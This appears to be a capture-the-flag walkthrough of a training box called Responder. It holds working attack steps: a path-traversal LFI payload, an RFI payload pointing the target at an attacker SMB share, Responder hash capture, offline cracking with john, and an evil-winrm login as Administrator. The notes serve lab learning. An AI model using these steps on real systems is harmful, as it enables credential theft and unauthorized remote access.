# Responder

Capture an NTLMv2 hash via LLMNR/NBT-NS poisoning with Responder, crack it offline, then use the recovered credentials for access.

## Reconnaissance

```bash
nmap -sC -sV -p- --min-rate 1000 --max-retries 5 <target-ip>
```

> Curling `<target-ip>` directly returns a one-line HTML redirect to `unika.htb`; the hostname must be manually added to `/etc/hosts` before the site becomes reachable.

Web app on port 80 (`unika.htb`) is vulnerable to LFI/RFI via the `page` parameter.

> The `page` parameter vulnerability was prompted by the box's guided questions.

```text
http://unika.htb/?page=../../../../../../../../windows/system32/drivers/etc/hosts
http://unika.htb/?page=//<attacker-ip>/somefile
```

> This has to be an IP I control (not an arbitrary one), since RFI here is used to force the target to reach out to my SMB share to leak the hash.

## Capturing the hash

Start Responder to catch the outbound SMB auth attempt triggered by the RFI:

```bash
sudo responder -I tun0 -v
```

Hash lands in the Responder logs. Save it:

```bash
echo '<HASH>' > hashes.txt
```

## Cracking

```bash
john --list=formats |v grep -i ntlm # I see `netntlmv2` which is what we need.
sudo gunzip /usr/share/wordlists/rockyou.txt.gz # john did not support using the compressed file directly
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 hashes.txt
```

Recovered password: `badminton`

## Access

```bash
xfreerdp /v:<target-ip> /u:administrator /p:badminton
```

Did not work. RDP disabled.

Re-scan to check for other services:

```bash
nmap -sC -p- --min-rate 1000 --max-retries 5 <target-ip>
```

WinRM open on 5985:

```bash
evil-winrm -i <target-ip> -u Administrator -p 'badminton'
```

---

## Troubleshooting: Responder SSL server fails to start (443/5986)

**Symptom:**

```bash
[!] Error starting SSL server on port 443, check permissions or other servers running.
[!] Error starting SSL server on port 5986, check permissions or other servers running.
```

Misleading error, not actually a port conflict, confirmed via:

```bash
sudo ss -tulpn | grep LISTEN
```

Ports were free.

**Root cause:** cert/key were never generated.

```bash
ls -la /usr/share/responder/certs/
# -> only gen-self-signed-cert.sh present, no responder.crt / responder.key
```

`Responder.conf` expects relative paths:

```sh
SSLCert = certs/responder.crt
SSLKey = certs/responder.key
```

**Gotcha:** `gen-self-signed-cert.sh` also uses a relative path internally, so it must be run with cwd `/usr/share/responder`, not from inside `certs/` itself.

**Fix:**

```bash
cd /usr/share/responder
sudo bash certs/gen-self-signed-cert.sh
```

**Verify:**

```bash
ls -la /usr/share/responder/certs/
# -> should now show responder.crt and responder.key
```

Rerun Responder normally, 443/5986 bind fine.
